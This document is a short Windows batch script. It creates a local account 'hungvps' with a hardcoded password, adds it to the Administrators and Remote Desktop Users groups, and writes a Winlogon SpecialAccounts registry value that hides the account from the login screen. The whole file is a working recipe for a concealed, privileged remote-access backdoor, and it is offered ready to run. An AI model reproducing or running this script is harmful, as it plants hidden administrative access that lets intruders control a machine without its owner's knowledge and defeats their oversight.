@echo off
net user hungvps Hung2007@ /add
net localgroup administrators hungvps /add
net localgroup "remote desktop users" hungvps /add
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v hungvps /t REG_DWORD /d 0
pause
exit
